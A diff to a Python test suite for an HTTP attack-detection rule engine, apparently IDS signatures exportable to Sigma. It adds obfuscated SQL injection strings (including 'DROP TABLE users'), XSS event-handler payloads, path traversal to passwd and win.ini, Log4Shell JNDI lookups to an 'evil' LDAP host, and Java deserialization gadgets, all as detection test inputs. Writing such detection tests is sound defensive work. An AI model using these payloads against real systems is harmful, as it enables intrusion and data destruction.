@@ -36,18 +36,21 @@ def by_id(rules):
 
 
 def _req(uri="/x", body="", method="GET"):
-    """构造一个 http_request 事件（normalized 走真实的 normalize）。"""
-    raw = f"{method} {uri} HTTP/1.1\r\nHost: shop.internal\r\n\r\n{body}"
-    return HttpEvent(
-        ts=__import__("datetime").datetime(2026, 11, 4, 21, 0, 0),
-        ip="203.0.113.9",
-        port=51234,
-        method=method,
-        host="shop.internal",
-        uri=uri,
-        body=body,
-        raw=raw,
-        normalized=normalize(raw),
+    """构造一个 http_request 事件（走**生产**的 `_build_event`）。
+
+    v2.0 改成调用生产函数而不是手工拼 HttpEvent：引擎多了一个判据视图
+    `sql_view`，手工构造时忘了填，`field: sql_view` 的规则就会静默不命中——
+    测试全绿、线上漏报，这是最坏的一种"测试通过"。所以让测试也走同一条
+    事件构造路径，字段永远齐。
+    """
+    from collectors.pcap import _build_event
+    return _build_event(
+        __import__("datetime").datetime(2026, 11, 4, 21, 0, 0),
+        "203.0.113.9",
+        51234,
+        f"{method} {uri} HTTP/1.1".encode("utf-8"),
+        {"host": "shop.internal"},
+        body.encode("utf-8"),
     )
 
 
@@ -144,6 +147,100 @@ def test_path_traversal_is_caught(by_id, uri):
 
 
 # --------------------------------------------------------------------------
+# v2.0：判据从「枚举写法」变成「描述形状」
+#
+# 这一组样本的共同点是——**它们的写法各不相同，但语法是同一件事**。
+# 子串判据只能一个个枚举，正则判据能一次覆盖整族；测试要守的就是"整族"，
+# 所以每条规则都给多种分隔符/编码变体，而不是只给一个教科书 payload。
+# --------------------------------------------------------------------------
+
+@pytest.mark.parametrize("uri", [
+    "/item?id=1 union select 1",              # 空格
+    "/item?id=1 union%0Aselect 1",            # 换行
+    "/item?id=1 union%09select 1",            # Tab
+    "/item?id=1 union/**/all/**/select 1",    # 注释 + all
+    "/item?id=1 /*!50000un*/ion select 1",    # MySQL 版本注释劈开关键字
+    "/item?id=1 un/**/ion se/**/lect 1",      # 关键字内部插注释
+])
+def test_sqli_union_separator_variants_are_caught(by_id, uri):
+    """`union` 与 `select` 之间可以是任何 SQL 空白/注释，判据要覆盖整族。"""
+    assert "http-sqli-union-select" in _hits(_req(uri), [by_id["http-sqli-union-select"]])
+
+
+@pytest.mark.parametrize("uri", [
+    "/item?id=1234 OR 1=1",                        # 无引号恒真
+    "/item?id=1' AND '1'='1' --",                  # 带引号（右引号常不闭合）
+    '/item?id=-1839" or "1"="2',                   # 双引号
+    "/item?id=1 and (1)=(1)",                       # 括号包裹
+    "/item?id=EmptyValue' and 526=527",             # 恒假式盲注
+    "/item?id=%u2019%20or%20%u2019a%u2019%3d%u2019a",   # IIS %uXXXX
+])
+def test_sqli_boolean_tautology_variants_are_caught(by_id, uri):
+    assert "http-sqli-boolean-blind" in _hits(
+        _req(uri), [by_id["http-sqli-boolean-blind"]])
+
+
+@pytest.mark.parametrize("uri,body,rule", [
+    ("/item?id=1; DROP TABLE users--", "", "http-sqli-stacked"),
+    ("/item?id=1 AND extractvalue(1,concat(0x7e,user()))", "", "http-sqli-error-based"),
+    ("/item?id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)", "", "http-sqli-error-based"),
+])
+def test_new_sqli_rules_are_caught(by_id, uri, body, rule):
+    assert rule in _hits(_req(uri, body, "POST" if body else "GET"), [by_id[rule]])
+
+
+@pytest.mark.parametrize("body", [
+    "c=<details open ontoggle=alert(1)>",                       # 冷门事件名
+    "c=<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",         # 非 alert 的执行函数
+    "c=<body onpageshow=alert(1)>",
+    "c=<img src=x &#111;nerror=alert(1)>",                       # 数字实体拆属性名
+    "c=<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\" src=\"data:,alert(1)\"/>",
+])
+def test_xss_structural_variants_are_caught(by_id, body):
+    """事件处理器与命名空间标签：判据是"结构"，不是"那几个字符串"。"""
+    ids = _hits(_req("/comment", body, "POST"),
+                [by_id["http-xss-event-handler"], by_id["http-xss-script-injection"]])
+    assert ids, f"未命中: {body}"
+
+
+@pytest.mark.parametrize("uri,rule", [
+    ("/get?foo=.../.../WINDOWS/win.ini", "http-path-traversal-obfuscated"),
+    ("/get?foo=0x2e.%000x2f0x2e.%00/WINDOWS/win.ini", "http-path-traversal-obfuscated"),
+    ("/get?foo=0x5c0x2e.%00/", "http-path-traversal-obfuscated"),
+    ("/download?f=..%c0%af..%c0%afetc%c0%afpasswd", "http-encoding-overlong-utf8"),
+])
+def test_encoding_bypass_variants_are_caught(by_id, uri, rule):
+    assert rule in _hits(_req(uri), [by_id[rule]])
+
+
+@pytest.mark.parametrize("ua", [
+    "${jndi:ldap://evil/a}",
+    "${${lower:j}ndi:ldap://evil/a}",        # 前缀被查找拆开
+    "${${env:FOO:-j}ndi:ldap://evil/a}",
+    "${jndi:${lower:l}dap://evil/a}",        # 连协议名都被拆开
+])
+def test_jndi_obfuscation_variants_are_caught(by_id, ua):
+    """判据是 JNDI 协议串，不是 `${jndi:` 这四个字母。"""
+    from collectors.pcap import _build_event
+    import datetime as _dt
+    ev = _build_event(_dt.datetime(2026, 11, 14, 21, 0, 0), "203.0.113.9", 5000,
+                      b"GET / HTTP/1.1", {"host": "x", "user-agent": ua}, b"")
+    assert "http-log4shell-jndi" in _hits(ev, [by_id["http-log4shell-jndi"]])
+
+
+@pytest.mark.parametrize("body", [
+    '{"@type":"java.net.Inet4Address","val":"evil"}',
+    '{"@TYPE":"java.net.Inet4Address","val":"evil"}',          # 大小写变形
+    '{"@type":"com.sun.rowset.JdbcRowSetImpl","x":"ldap://e/a"}',
+    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",          # Java 序列化魔数
+])
+def test_deserialization_payloads_are_caught(by_id, body):
+    ids = _hits(_req("/api/parse", body, "POST"),
+                [by_id["http-fastjson-autotype"], by_id["http-java-serialized"]])
+    assert ids, f"未命中: {body}"
+
+
+# --------------------------------------------------------------------------
 # 真阴性：长得像但不是 —— 一条都不许报
 # --------------------------------------------------------------------------
 BENIGN = [
@@ -159,6 +256,20 @@ BENIGN = [
     ("/health", "", "GET"),
     ("/item?id=1001", "", "GET"),
     ("/api/upload", "filename=report-2026.pdf", "POST"),
+    # ---- v2.0 新增的"擦边球"：判据放宽之后，这些必须仍然不报 ----
+    # 自然语言搜索参数：有 and/or 有等号，但不是布尔条件
+    ("/search?q=red and size=xl", "", "GET"),
+    ("/search?q=cats or dogs=yes", "", "GET"),
+    # 单层的 0x2e（普通十六进制参数，没有配套的 0x2f/0x5c）
+    ("/api/render?color=0x2e2e2e", "", "GET"),
+    # base64 串中间恰好撞上 ro0ab —— 真实流量里出现过 8 次（广告平台 cookie）
+    ("/p?token=0ro0abxcsaaanjwaaaaaaaaaaaaa", "", "GET"),
+    # JSON-LD 的 @type 是短名，不是全限定类名
+    ("/api/ld", '{"@type":"Person","name":"x"}', "POST"),
+    # 事件处理器没有标签上下文：单独出现不是 XSS（也不会被执行）
+    ("/api/comment", "content=请用 onerror 事件监听图片失败", "POST"),
+    # 正常的 HTML 片段
+    ("/api/comment", "content=<p>这是一段正文</p>", "POST"),
 ]
 
 
@@ -167,6 +278,23 @@ def test_benign_requests_trigger_nothing(rules, uri, body, method):
     """正常请求全规则零命中。这是这组规则能不能活下来的底线。"""
     event = _req(uri, body, method)
     assert _hits(event, rules) == [], f"误报了: {uri} {body}"
+
+
+def test_union_rule_known_false_positive_is_documented(by_id):
+    """**已知识别边界**：搜索框里输入 `union select` 会被判成注入。
+
+    这条测试断言的是"它确实会报"，不是"它不该报"。放在这里而不是从
+    阴性用例里删掉，是因为删掉等于把问题藏起来：判据是子串/正则，
+    它无法区分"用户在搜索 SQL 语法"与"攻击者在注入"——这个区别需要
+    上下文（参数名、是否进了 WHERE 子句、错误回显），不是签名能给的。
+
+    所以这条边界要**写在规则里、写在 BENCHMARK 里、也写在测试里**。
+    三份实测（周一/周二/周四全量 15.0 万条良性请求）里这种情况是 0 次，
+    但技术博客的站内搜索确实可能撞上，部署时应知道这个代价。
+    """
+    assert "http-sqli-union-select" in _hits(
+        _req("/search?q=union select committee report"),
+        [by_id["http-sqli-union-select"]])
 
 
 def test_threshold_rule_match_is_a_filter_not_a_verdict(by_id):
@@ -219,10 +347,15 @@ def test_sqli_detected_through_pcap_pipeline(tmp_path, rules):
 
 
 def test_new_rules_are_exportable_to_sigma(by_id):
-    """新增的 7 条都应是可导出的签名规则（阈值规则才不可导出）。"""
+    """Web 攻击这一组都应可导出为 Sigma（阈值规则才不可导出）。
+
+    v2.0 增加了 error-based / stacked / traversal-obfuscated 三条，
+    并且给前两条 SQLi 换成了正则判据——正则必须能导出成 `|re`，
+    否则它们会从 `sigma/` 里静默消失。
+    """
     new_ids = [rid for rid in by_id if rid.startswith(("http-sqli", "http-xss"))
-               or rid == "http-path-traversal"]
-    assert len(new_ids) == 7
+               or rid.startswith("http-path-traversal")]
+    assert len(new_ids) == 10, sorted(new_ids)
     from tools.to_sigma import to_sigma
     for rid in new_ids:
         data = to_sigma(by_id[rid])
